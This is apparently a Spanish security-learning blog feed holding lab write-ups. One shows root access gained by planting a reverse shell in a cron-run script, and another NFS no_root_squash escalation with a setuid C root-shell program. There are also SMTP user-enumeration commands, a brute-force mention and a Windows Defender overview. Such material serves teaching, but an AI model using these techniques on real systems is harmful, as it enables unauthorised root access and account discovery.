+<p>Vemos que llama a un archivo <em>print.sh</em> el cual si puede ejecutarlo, por tanto, podemos colar una reverse shell en el fichero para que se pueda ejecutar. Si hacemos un <code class="language-plaintext highlighter-rouge">cat /etc/crontabs</code> podemos ver que el archivo <em>planner.sh</em> y <em>startup_list.txt</em> pertenecen al root, por lo que estas se ejecutarán como root.</p>
+
+<p>Si accedemos a la web <a href="https://www.revshells.com/">Revshells</a> podemos crear una reverse shell que luego introduciremos en dicho fichero:</p>
+<div style="text-align:left">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:50%">
+      1. Modificamos el archivo <code>/etc/print.sh</code> introduciendo la reverse shell
+        <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/Untitled 13.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px;" />
+        </div>
+      Si esperamos un poco vemos que la conexión se realiza con éxito. Podemos ver que somos el usuario root por lo que ya podremos acceder a la flag la cual se encuentra en <code>/root/root.txt</code>. (como podemos ver en la imagen de la derecha).
+      </td>
+      <td style="vertical-align:top; width:50%">
+      2. Habilitamos un puerto de escucha para que el servidor se conecte a nuestra máquina:
+      <div style="text-align:center; ">
+          <img src="../assets/images/Rooms/Startup/b.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<hr />]]></content><author><name></name></author><category term="Enumeración" /><category term="Reverse shell" /><category term="Wireshark" /><summary type="html"><![CDATA[Abuse traditional vulnerabilities via untraditional means.]]></summary></entry><entry><title type="html">Aspectos Básicos de Windows III</title><link href="http://localhost:4000/blog/WindowsIII" rel="alternate" type="text/html" title="Aspectos Básicos de Windows III" /><published>2024-08-08T00:00:00+02:00</published><updated>2024-08-08T00:00:00+02:00</updated><id>http://localhost:4000/blog/WindowsIII</id><content type="html" xml:base="http://localhost:4000/blog/WindowsIII"><![CDATA[<blockquote>
+  <p>En la última parte veremos herramientas integradas en Windows para mantener los equipos seguros como Windows Update, Seguridad de Windows, BitLocker y más.</p>
+</blockquote>
+
+<h1 id="windows-update">Windows Update</h1>
+
+<p>Windows Update es un servicio proporcionado por Microsoft que nos permite instalar actualizaciones de seguridad, nuevas características en los equipos con Windows instalado.</p>
+
+<p>Podemos acceder a Windows Update de dos formas:</p>
+<table>
+  <tr>
+    <td style="text-align:left; vertical-align:top; width:700px"><ol>
+        <li>En Configuración en la sección <em>Actualización y seguridad</em>.</li>
+        <li>Haciendo uso del uso del comando: <code>control /name Microsoft.WindowsUpdate</code> ya sea en el <code>cmd</code> (<a href="https://joseeelv.github.io//blog/WindowsII">Símbolo del sistema</a>) de la combinación de teclas de Ejecutar `Windows + R` que nos llevará a la Configuración de Windows (arriba).</li>
+      </ol>
+      <div style="text-align:left;">
+        <img src="../assets/images/Labs/WindowsIII/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:400px" />
+      </div>
+    </td>
+    <td style="vertical-align:top;">
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/WindowsIII/image-20230922102018818.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<h1 id="seguridad-de-windows">Seguridad de Windows</h1>
+
+<p>La Seguridad de Windows nos ayuda a administrar las herramientas que protegen el equipo y sus datos.
+También está disponible en <em>Configuración &gt; Actualización y seguridad</em>.</p>
+
+<div style="text-align:left; ">
+  <img src="../assets/images/Labs/WindowsIII/image-20230922102616439.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:300px" />
+</div>
+
+<p>Se usa para realizar escaneos de archivos en la computadora a la hora de comprobar si nuestro equipo contiene malware y más.
+Encontramos varias áreas de protección:</p>
+<ul>
+  <li>Protección contra virus y amenazas.</li>
+  <li>Firewall y protección de red.</li>
+  <li>Control de aplicaciones y navegadores.</li>
+  <li>Seguridad del dispositivo.</li>
+</ul>
+<p>Además encontraremos varios colores indicadores dependiendo del estado en que se encuentre el equipo, <strong>verde</strong> (equipo protegido), <strong>amarillo</strong> (se sugiere revisar la seguridad del equipo) y <strong>rojo</strong> (equipo necesita atención inmediata).<br /><br />
+En esta sección de <em>Seguridad de Windows</em> podemos realizar escaneos/análisis de los archivos que contiene el sistema para comprobar que el equipo está seguro y ningún archivo es malicioso.</p>
+
+<table>
+  <tr>
+    <td style="text-align:left; vertical-align:top; width:800px">
+      <h2>Tipos de análisis</h2>
+      <ul>
+        <li><strong>Análisis / escaneo rápido</strong>: comprueba las carpetas donde se pueden encontrar comúnmente las amenazas.</li>
+        <li><strong>Análisis / escaneo completo</strong>: se comprueba todas las carpetas, archivos y programas en ejecución que se encuentran en el equipo, este es un análisis mucho más lento pero más seguro.</li>
+        <li><strong>Análisis / escaneo personalizado</strong>: el usuario es libre de personalizar el análisis (los archivos o carpetas que se desean verificar).</li>
+      </ul>
+      <h2>Historial de protección</h2>
+      Contiene todas las acciones que <em>Windows Defender</em> ha tomado a la hora de haberse realizado un análisis.<br />
+      Si el antivirus encuentra/detecta un fragmento de malware, este los registrará en el historial de protección.<br /><br />
+      <strong>Amenazas en cuarentena</strong>: estas amenazas se han aislado del sistema y se ha impedido la ejecución en el equipo. Serán eliminadas periódicamente.<br /><br />
+      También podemos realizar las acciones de <strong>quitar</strong> (elimina la amenaza del dispositivo) ó <strong>restaurar</strong> (vuelve a colocar el archivo en la carpeta donde se encontraba y el antivirus lo volverá a detectar como una amenaza).<br /><br />
+      <strong>Amenazas permitidas</strong>: son elementos identificados como amenazas pero se les permite la ejecución en el equipo.
+      <h2>Configuración de protección contra virus y amenazas</h2>
+      Aquí podemos administrar la configuración de la protección del equipo:
+      <ul>
+        <li><strong>Protección en tiempo real</strong>: localiza y evita que se ejecute malware en el equipo.</li>
+        <li><strong>Protección entregada en la nube</strong>: ofrece una mayor protección y más rápida debido a que el equipo tiene acceso a las definiciones (contenida en la nube) más actualizadas de las amenazas. El equipo no obstante debe de tener conexión a internet para poder acceder a dicha nube.</li>
+        <li><strong>Envío automático de muestras</strong>: si el equipo está conectado a la nube, podemos hacer que 'Defender' envíe automáticamente archivos sospechosos a Windows para comprobar si hay amenazas potenciales.</li>
+        <li><strong>Acceso controlado a carpetas</strong>: podemos proteger archivos, carpetas, espacios de memoria del equipo de cambios no autorizados provocado por aplicaciones de terceros.</li>
+        <li><strong>Exclusiones</strong>: podemos indicarle a 'Defender' una serie de carpetas de confianza las cuales no analizará.</li>
+        <li><strong>Notificaciones</strong>: 'Defender' nos enviará notificaciones cuando encuentre alguna amenaza en el sistema para que se realice una acción frente a ella y del estado del equipo.</li>
+      </ul>
+      <h2>Protección frente a ransomware</h2>
+      <blockquote>
+        <p><em>Un ransomware es un tipo de malware dedicado a la encriptación de carpetas, archivos o equipos al completo con el fin de obtener los datos del usuario infectado.</em></p>
+      </blockquote>
+      Para ello, <em>Windows Defender</em> nos permite configurar el acceso a carpetas de forma controlada:<br /><br />
+      <strong>Acceso controlado a carpetas</strong>: para que el equipo esté protegido contra ransomware se requiere que esta función esté habilitada, además de la protección a tiempo real.
+    </td>
+    <td>
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/WindowsIII/Untitled 1.png" alt="Untitled" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<h1 id="firewall-y-protección-de-red">Firewall y protección de red</h1>
+
+<blockquote>
+  <p>Un firewall controla el tráfico de red que fluye dentro y fuera de los dispositivos a través de los puertos</p>
+</blockquote>
+
+<p>Podemos acceder mediante el comando <code class="language-plaintext highlighter-rouge">WF.msc</code> en Ejecutar.</p>
+
+<p>Nos ofrece una vista de las redes a las que está conectado el equipo, se puede activar / desactivar y podemos acceder a las opciones avanzadas para los siguientes tipos de red:</p>
+
+<ul>
+  <li><strong>Redes de dominio</strong>: redes donde el sistema host puede autenticarse en un controlador de dominio.</li>
+  <li><strong>Redes privadas</strong>: son las redes reconocibles, el usuario asigna esta red y se utiliza para redes domésticas.</li>
+  <li><strong>Redes públicas</strong>: son las redes no reconocibles, es el predeterminado que se utiliza para designar redes públicas como puntos de acceso Wi-Fi en ubicaciones públicas.</li>
+</ul>
+
+<h2 id="permitir-una-aplicación-a-través-del-firewall">Permitir una aplicación a través del firewall</h2>
+
+<table>
+  <tr>
+    <td style="vertical-align:top; text-align:left; width:50%">
+    Podemos agregar una excepción para la aplicación que está siendo bloqueada por el firewall o también podemos asignar un puerto específico.<br /><br />
+    Podemos ver la configuración actual de cualquier perfil de firewall, si es privado y/o público y en la opción ‘Detalles’ podemos ver el nombre y una breve descripción sobre el perfil.
+    <div style="text-align:center;">
+      <img src="../assets/images/Labs/WindowsIII/Untitled 2.png" alt="Untitled" onclick="openModal(this.src)" />
+    </div>
+    </td>
+    <td>
+    <div style="text-align:left; vertical-align:top;">
+      <img src="../assets/images/Labs/WindowsIII/Untitled 3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px" />
+    </div>
+    </td>
+  </tr>
+</table>
+
+<h2 id="configuración-avanzada">Configuración avanzada</h2>
+
+<p>Está orientado a usuarios avanzados de Windows.</p>
+
+<p>Podemos crear reglas de entradas/salidas, reglas de seguridad de conexión y ver registros de supervisión para el firewall, si no se tiene un buen conocimiento sobre estas opciones podemos hacer que el equipo sea más vulnerable o que algunas aplicaciones dejen de funcionar.</p>
+
+<h1 id="control-de-explorador-y-aplicaciones">Control de explorador y aplicaciones</h1>
+
+<blockquote>
+  <p>Microsoft Defender SmartScreen nos protege de phishing o aplicaciones de malware y de la descarga de archivos maliciosos.</p>
+</blockquote>
+
+<p>Gracias al control del explorador y de las aplicaciones podemos bloquear o realizar advertencias sobre aplicaciones, archivos, descargas y contenido de webs maliciosas, también podemos desactivar tanto el bloqueo como las advertencias, algo <strong>NO</strong> recomendable.</p>
+
+<h2 id="protección-contra-vulnerabilidades">Protección contra vulnerabilidades</h2>
+
+<p>Esta protección viene integrada en Windows lo que hace que proteja al equipo desde el momento en que se inicia el sistema operativo. Esta configuración se puede personalizar (tanto el equipo como aplicaciones), pero <strong>NO</strong> es recomendable si no se está seguro de lo que se hace.</p>
+
+<p>Se puede compartir la configuración en los dispositivos que estén interconectados (por ejemplo una organización).</p>
+
+<h1 id="seguridad-del-dispositivo">Seguridad del dispositivo</h1>
+
+<p>Ofrece opciones de seguridad integradas que ayudan a proteger de malware.</p>
+
+<h2 id="aislamiento-del-núcleo">Aislamiento del núcleo</h2>
+
+<p>Nos aporta protección adicional contra malware y otros ataques al aislar los procesos del equipo del sistema operativo y del dispositivo.</p>
+
+<p>En la sección de ‘<em>Detalles de aislamiento del núcleo</em>’ podemos habilitar / deshabilitar y cambiar la configuración del mismo.</p>
+
+<h3 id="integridad-de-la-memoria">Integridad de la memoria</h3>
+
+<p>Es una característica del aislamiento del núcleo, donde al activarlo evita que el malware tenga acceso a los procesos de alta seguridad en caso de un ataque.</p>
+
+<h2 id="procesador-de-seguridad">Procesador de seguridad</h2>
+
+<p>Ofrece un cifrado adicional para el dispositivo.</p>
+
+<p>Si accedemos a la sección `<em>Detalles del procesador de seguridad</em>’ encontramos información sobre el fabricante, la versión, el TPM y más.</p>
+
+<blockquote>
+  <p>Trusted Plataform Module (TPM) es una tecnología diseñada por Microsoft para ofrecer funciones basadas en hardware y relacionadas con la seguridad.
+Un chip TPM es un criptoprocesador seguro diseñado para realizar operaciones de criptografía. Este chip incluye múltiples mecanismos físicos de seguridad para hacerlo resistente frente a la manipulación y para que el malware no pueda manipular las funciones de seguridad del TPM.</p>
+</blockquote>
+
+<h1 id="bitlocker">BitLocker</h1>
+
+<blockquote>
+  <p>BitLocker Drive Encryption es una función de protección de datos que se integra con el sistema operativo y que hace frente a las amenazas de robo y exposición de datos.</p>
+</blockquote>
+
+<p>Los equipos que tienen instalado TPM, BitLocker ofrece una mejor protección.</p>
+
+<p>Según Microsoft, BitLocker ofrece la mejor protección cuando se utiliza con un TPM cuya versión es la 1.2 o superior.</p>
+
+<p>Los equipos más nuevos ya contienen un TPM instalado por el fabricante del equipo.</p>
+
+<h1 id="servicio-de-copia-de-seguridad-de-discos">Servicio de copia de seguridad de discos</h1>
+
+<blockquote>
+  <p>El servicio de copias de seguridad de discos (VSS) coordina las acciones necesarias para la creación de snapshots (instantáneas) coherentes de los datos que se va a realizar la copia de seguridad.</p>
+</blockquote>
+
+<p>Estas snapshots se almacenan en la carpeta de información de cada disco que tiene habilitada dicha protección.</p>
+
+<p>Si VSS está habilitado podemos realizar varias tareas como <strong>Crear un punto de restauración</strong>, <strong>Restaurar el sistema</strong>, <strong>Configurar las opciones de restauración</strong>, <strong>Eliminar puntos de restauración.</strong></p>
+
+<hr />]]></content><author><name></name></author><category term="LAB" /><summary type="html"><![CDATA[Este módulo es el tercer y último introductorio de Windows. En este laboratorio, exploramos diversas herramientas integradas en Windows diseñadas para proteger y asegurar los equipos. La seguridad en Windows se gestiona a través de varias aplicaciones y configuraciones clave.]]></summary></entry><entry><title type="html">Recorrido de una Aplicación web</title><link href="http://localhost:4000/blog/WalkinganApplication" rel="alternate" type="text/html" title="Recorrido de una Aplicación web" /><published>2024-08-08T00:00:00+02:00</published><updated>2024-08-08T00:00:00+02:00</updated><id>http://localhost:4000/blog/WalkinganApplication</id><content type="html" xml:base="http://localhost:4000/blog/WalkinganApplication"><![CDATA[<p>Vamos a aprender a revisar manualmente una aplicación web para poder detectar problemas de seguridad haciendo solo de las herramientas integradas del buscador.</p>
+
+<p>Ya que los scripts y herramientas de seguridad pasarán por alto muchas vulnerabilidades.</p>
+
+<p>Encontramos herramientas como:</p>
+
+<ul>
+  <li>Ver el <em>código fuente</em> de la página web.</li>
+  <li><em>Inspector</em>: inspeccionar los elementos de una página web y realizar cambios en contenido generalmente bloqueado.</li>
+  <li><em>Depurador</em>: inspecciona y controla el flujo JavaScript de una página web.</li>
+  <li><em>Red</em>: ver todas las solicitudes de red que realiza una página web.</li>
+</ul>
+
+<p>Ver el código fuente de una página web puede ayudarnos a descubrir más información sobre la aplicación web.</p>
+
+<p>El código devuelto se compone de HTML, CSS y JavaScript.</p>
+
+<p>Para acceder al código fuente de la página web —&gt; <em>view-source:URL_pagina_web</em>.</p>
+
+<h3 id="ejemplo-con-la-página-web-de-google">Ejemplo con la página web de Google</h3>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/RecorrerSolicitud/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:300px" />
+</div>
+
+<p>Pequeño extracto del código fuente de la web de <a href="https://Google.com">Google</a>:</p>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/RecorrerSolicitud/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;" />
+</div>
+
+<p>En el código fuente de la página web podemos encontrar comentarios realizados por el desarrollador del sitio web, estos comentarios vienen dados por <code class="language-plaintext highlighter-rouge">&lt;! -- comentario --&gt;</code></p>
+
+<p>También podemos encontrar enlaces a diferentes páginas HTML <code class="language-plaintext highlighter-rouge">&lt;a href="/pagina_web"</code> , también podemos encontrar enlaces ocultos en una página web <code class="language-plaintext highlighter-rouge">serc</code> donde se puede encontrar alguna área privada utilizada por la empresa/organización para almacenar información sobre clientes, personal o de la propia empresa.</p>
+
+<p>Los archivos CSS, JavaScript e imágenes pueden ser incluidos mediante código HTML, estos archivos se pueden almacenar en el mismo directorio y si este directorio aparece en el navegador encontramos un error de configuración.</p>
+
+<p>Hoy en día las páginas webs están realizadas a través de un marco(código prefabricado), este marco si no está actualizado y contiene vulnerabilidades públicas para esa versión y el sitio web estaría en peligro.</p>
+
+<p>La versión del marco utilizado se encuentra en un comentario al final del código fuente.</p>
+
+<h2 id="herramientas-para-desarrolladores">Herramientas para desarrolladores</h2>
+
+<p>Cada navegador incluye herramientas para desarrolladores para depurar aplicaciones web.</p>
+
+<p>Como pentester podemos aprovechar estas herramientas para proporcionarnos una compresión mucho más profunda y mejor sobre el sitio web.</p>
+
+<p>Nos centraremos en las características: <em>Inspector</em>, <em>Debugger</em> y <em>Red</em>.</p>
+
+<h3 id="herramientas-para-desarrolladores---inspección">Herramientas para desarrolladores - Inspección</h3>
+
+<p><em>Element inspector</em> nos ayuda mostrándonos una representación en directo del contenido del sitio web, pudiendo editar e interactuar con los elementos de la página web.</p>
+
+<p>Con esto podemos acceder a lugares que previamente estaban bloqueados modificando así el valor que no nos permitía acceder.</p>
+
+<h3 id="herramientas-para-desarrolladores---depuración">Herramientas para desarrolladores - Depuración</h3>
+
+<p>La depuración está destinada a código JavaScript y nos es muy útil a la hora de averiguar si algo no está funcionando correctamente.</p>
+
+<p>Como pentester nos da la oportunidad de poder profundizar en el código JavaScript de la página web.</p>
+
+<p>Cuando estamos en la sección de depurador ‘<em>Debugger’</em> , en la parte de la izquierda encontramos todos los recursos que utiliza la página web actual.</p>
+
+<p>El código JavaScript se ve en una única línea ya que se ha ofuscado( ilegible ) para que sea complicado de leer.</p>
+
+<p>Usando la opción <em>Pretty Print</em> ‘{ }’ del debugger podemos mostrar el código JS de manera más legible.</p>
+
+<p>Podemos hacer uso de <em>Breakpoints</em> para forzar al navegador que se pare antes de ejecutar una parte del código JS. Si hacemos click en el numero de la línea del código, se pondrá automáticamente un breakpoint.</p>
+
+<h3 id="herramientas-para-desarrolladores---red">Herramientas para desarrolladores - Red</h3>
+
+<p>Desde la pestaña de red ‘<em>Network</em>’ podemos hacer un seguimiento de las peticiones / solicitudes que realiza la página web. Si hacemos click en la pestaña de Red y seguidamente actualizamos la página web, veremos todos los archivos que solicita la misma.</p>
+
+<p>AJAX es un método para enviar y recibir datos de red en un fondo de aplicación web sin interferir cambiando la página web actual</p>
+
+<hr />]]></content><author><name></name></author><category term="LAB" /><summary type="html"><![CDATA[Este laboratorio se centra en la revisión manual de una aplicación web para detectar problemas de seguridad utilizando solo las herramientas integradas del navegador. Estas herramientas son esenciales porque a menudo pueden revelar vulnerabilidades que las herramientas automáticas pasan por alto.]]></summary></entry><entry><title type="html">Servicios de red II</title><link href="http://localhost:4000/blog/ServiciosRedII" rel="alternate" type="text/html" title="Servicios de red II" /><published>2024-08-08T00:00:00+02:00</published><updated>2024-08-08T00:00:00+02:00</updated><id>http://localhost:4000/blog/ServiciosRedII</id><content type="html" xml:base="http://localhost:4000/blog/ServiciosRedII"><![CDATA[<h1 id="protocolo-nfs">Protocolo NFS</h1>
+
+<p><em>Network File System</em> o <em>NFS</em> es un protocolo de red que permite a los sistemas acceder a los archivos de una red, de una manera similar a como acceden a los archivos que tienen en su propio sistema de archivo.</p>
+
+<p>Mediante NFS, tanto los usuarios como los programas pueden acceder a los archivos remotos como si estos fueran locales. Esto se hace montando todo, o una parte de un sistema de archivos en un servidor.</p>
+
+<p>Hace uso del protocolo <strong>RPC</strong> (Remote Procedural Call) para realizar la comunicación cliente-servidor.</p>
+
+<h2 id="como-funciona-nfs">Como funciona NFS</h2>
+
+<p>El servidor NFS configura qué directorios se van a compartir con los clientes en el archivo de configuración <code class="language-plaintext highlighter-rouge">/etc/exports</code>.</p>
+
+<p>Luego estos directorios compartidos se montan en los clientes del servidor NFS mediante el comando <code class="language-plaintext highlighter-rouge">mount &lt;ip_servidor&gt;:/&lt;directorio_compartido&gt; /mnt/&lt;montura_local&gt;</code>.</p>
+
+<p>Una vez montado los directorios compartidos que queremos en nuestro propio equipo podemos ejecutar comandos como → <code class="language-plaintext highlighter-rouge">ls</code>, <code class="language-plaintext highlighter-rouge">cp</code>, <code class="language-plaintext highlighter-rouge">mv</code>, etc.</p>
+
+<h2 id="como-enumerar-el-protocolo-nfs">Como enumerar el protocolo NFS</h2>
+<ol>
+  <li><strong>Uso del comando showmount:</strong>
+  Podemos hacer uso del comando <code>showmount -e ip_servidor</code> para ver los directorios compartidos del servidor.</li><br />
+  <li><strong>Uso de la herramienta Nmap:</strong>
+    Podemos realizar un escaneo de puertos para ver si está abierto un puerto que haga uso de un servicio NFS.</li><br />
+  <li><strong>Uso de rcpinfo:</strong>
+    Mediante la herramienta <strong>rcpinfo</strong> podemos obtener información sobre los servicios RPC con el comando <code>rcpinfo -p ip_servidor</code>.</li><br />
+  <li><strong>Escaneo manual de Directorios:</strong>
+    Como hemos comentado antes, los directorios que un servidor va a compartir se configuran en el fichero <code>/etc/exports</code>, por tanto, si realizamos una lectura del mismo encontraremos que recursos comparten y más información.</li><br />
+  <li><strong>Uso del comando nfsstat:</strong>
+  Este comando proporciona estadísticas y detalles sobre el servicio NFS.</li>
+</ol>
+
+<h2 id="como-explotar-el-protocolo-nfs">Como explotar el protocolo NFS</h2>
+
+<ol>
+  <li>
+    <p><strong>Comprobar fichero de configuración /etc/exports:</strong></p>
+
+    <p>Como hemos comentado antes, el fichero de configuración <code class="language-plaintext highlighter-rouge">/etc/exports</code> puede contener información valiosa a la hora de explotar NFS. Aquí vamos a encontrar si el recurso que se comparte tiene la opción de configuración <strong>root_squash</strong> activada o no.</p>
+
+    <p>Esta opción hace que cualquier usuario que tenga privilegios root en el sistema local, sea un usuario sin privilegios en el servidor.</p>
+
+    <p>Si no está configurado, es decir, tenemos <strong>no_root_squash</strong> el cliente con privilegios root, tendrá esos permisos en el servidor NFS.</p>
+
+    <p>Aquí podemos encontrar información de como escalar privilegios en NFS → <a href="https://joseeelv.github.io//blog/EPL">Escalar Privilegios</a>.</p>
+  </li>
+</ol>
+
+<h3 id="ejemplo-práctico">Ejemplo práctico:</h3>
+
+<ol>
+  <li>Realizamos un escaneo de puertos de la ip de la máquina víctima y vemos que tenemos un servicio NFS corriendo en el puerto 2049:</li>
+</ol>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+<div style="text-align:left; ">
+  <table>
+    <tr>
+      <td style="vertical-align:top;">
+      2. Vamos a nuestro directorio <code>/tmp</code> y creamos una nueva montura:
+        <div style="text-align:center; width:500px;">
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+        </div><br />
+      4. Vemos que hay un directorio llamado <code>/.ssh</code> si accedemos a él encontramos los ficheros <strong>id_rsa</strong> y <strong>id_rsa.pub</strong>:
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 4.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+      </td>
+      <td>
+      3. La montamos en nuetra máquina la montura que está compartiendo la máquina víctima, luego nos cambiamos al directorio que tiene dentro la montura, listamos directorios y vemos algunos archivos:
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<ol>
+  <li>Ahora podemos realizar la copia de ambos ficheros en nuestra máquina para poder visualizar su contenido, por ejemplo, visualizamos el contenido de <strong>id_rsa.pub</strong> y vemos que <em>cappucino</em> es el usuario del fichero <em>id_rsa</em>.</li>
+</ol>
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 5.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+</div>
+
+<div style="text-align:left; ">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:600px">
+      6. Tenemos el usuario <em>cappucino</em> y su <strong>id_rsa</strong>, por tanto, podemos realizar la conexión ssh:
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 6.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+      7. Ya dentro del servidor podemos ver los recursos que comparte:
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 7.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+      Código en C del exploit:
+      <pre>int main(){
+  setgid(0);
+  setuid(0);
+  system("/bin/bash -");
+  return 0;
+}</pre>
+      </td>
+      <td>
+      8. Y vemos que el directorio <code>/home</code> tiene activado el <strong>no_root_squash</strong>, por tanto, si metemos en dicho directorio un script que se ejecute con privilegios root, al no tener dicha configuración activa, si lo ejecutamos seremos un usuario con privilegios root y no uno normal.
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<div style="text-align:left; ">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:50%;">
+        <div style="text-align:center; ">
+        9. Incluimos dicho script en el directorio anteriormente comentado:
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 9.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align:center; ">
+        10. Vemos que se ha incluido y solamente  quedaría ejecutarlo:
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 10.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<ol>
+  <li>Finalmente, si hacemos <code class="language-plaintext highlighter-rouge">./exploitNFS</code> escalaremos privilegios y tendremos acceso a la flag.</li>
+</ol>
+
+<h1 id="protocolo-smtp">Protocolo SMTP</h1>
+
+<p>El protocolo <em>SMTP</em> (Simple Mail Transfer Protocol) es el estándar utilizado para el envío de correos electrónicos a través de redes IP.</p>
+
+<p>SMTP no maneja ni la recepción ni el almacenamiento de correos, para ello se utilizan otros protocolos como <em>POP3</em> (Post Office Protocol) o <em>IMAP</em> (Internet Message Access Protocol).</p>
+
+<p>Hace uso de un modelo cliente-servidor, donde el cliente envía los correos electrónicos a un servidor SMTP y estos los envía a otros servidores SMTP de destino.</p>
+
+<p>SMTP hace uso del puerto <code class="language-plaintext highlighter-rouge">TCP 25</code> para la conexión entre servidores, pero también usa los puertos <code class="language-plaintext highlighter-rouge">TCP 587</code> (correos con autenticación) y <code class="language-plaintext highlighter-rouge">TCP 465</code> (correo cifrado “smtps”).</p>
+
+<p>Los mensajes en SMTP se envían en texto plano, pero la conexión puede estar cifrada mediante <em>TLS/SSL</em>.</p>
+
+<h2 id="como-funciona-el-protocolo-smtp">Como funciona el protocolo SMTP</h2>
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 11.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+<ol>
+  <li>El cliente establece conexión con el servidor cuando manda un correo electrónico a través del puerto 25 (smtp handshake).</li><br />
+  <li>Luego SMTP usa un conjunto de comandos (en texto plano) para la comunicación entre el cliente y servidor, donde el servidor responde con códigos de estado que indica el resultado de la solicitud.</li><br />
+  <li>La transferencia de mensajes se realiza después de enviar el comando <code>DATA</code>, si el servidor no puede acceder al cliente destinatario, pone el correo electrónico en <strong>SMTP queue</strong>.</li><br />
+  <li>La conexión se cierra cuando el cliente hace uso del comando <code>QUIT</code>.</li><br />
+</ol>
+
+<h2 id="como-enumerar-el-protocolo-smtp">Como enumerar el protocolo SMTP</h2>
+
+<ol>
+  <li>
+    <p><strong>Conexión Telnet manual:</strong></p>
+
+    <p>Primero realizamos una conexión mediante Telnet:</p>
+  </li>
+</ol>
+<div style="text-align:center;">
+  <pre><code>
+telnet ip-servidor 25
+telnet ip-servidor 587 //si es con autenticación
+  </code></pre>
+</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Luego, podemos enviar comandos SMTP:
+</code></pre></div></div>
+
+<div style="text-align:left;">
+  <pre><code>
+EHLO ejemplo.com
+VRFY user@example.com
+EXPN list@example.com
+QUIT
+  </code></pre>
+</div>
+
+<ol>
+  <li>
+    <p><strong>Uso de la herramienta Nmap con scripts SMTP:</strong></p>
+
+    <p>Como hemos hecho en otros protocolos, podemos hacer uso de:</p>
+  </li>
+</ol>
+<div style="text-align:center;">
+  <pre><code>
+nmap -p 25 --script smtp-enum <ip-servidor>
+  &lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+    <strong>Scripts Útiles de Nmap para SMTP:</strong><br />
+  <ul>
+  <li><strong>smtp-enum</strong>: Enumera los usuarios y dominios disponibles.</li>
+  <li><strong>smtp-commands</strong>: Enumera los comandos soportados por el servidor SMTP.</li>
+  <li><strong>smtp-vrfy</strong>: Verifica si el servidor acepta la verificación de usuarios.</li>
+  <li><strong>smtp-open-relay</strong>: Comprueba si el servidor es un relay abierto.</li>
+</ul>
+1. <strong>Uso del comando smtp-user-enum:</strong>
+    
+    `smtp-user-enum` es una herramienta diseñada para enumerar usuarios en servidores SMTP, para ello podemos hacer uso de:
+    
+<div style="text-align:center;">
+  <pre><code>
+smtp-user-enum -M VRFY -U listausuario.txt -t <ip-servidor>
+  &lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+<ul>
+    <li><code>-M VRFT</code>: Usamos el comando `VRFY` para enumerar servicios.</li>
+    <li><code>-U listausuario.txt</code>: Especifica el archivo de texto que contiene la lista de usuarios a probar.</li>
+    <li><code>-t ip-servidor</code>: Especifica la ip del servidor SMTP.</li>
+</ul>
+1. <strong>Uso de Metasploit framework:</strong>
+    Metasploit Framework incluye módulos para enumerar y explotar servicios SMTP.
+2. <strong>Uso de smtp-cli:</strong>
+    
+    `smtp-cli`: es una herramienta de línea de comandos para probar servidores SMTP y enviar correos electrónicos desde una línea de comando.
+    
+
+## Como explotar el protocolo SMTP
+
+1. <strong>Ataque de fuerza bruta:</strong>
+    
+    Mediante `hydra` podemos realizar una ataque de fuerza bruta si contamos con el *username* de un usuario y un diccionario; por ejemplo *rockyou.txt*.  
+<div style="text-align:center;">
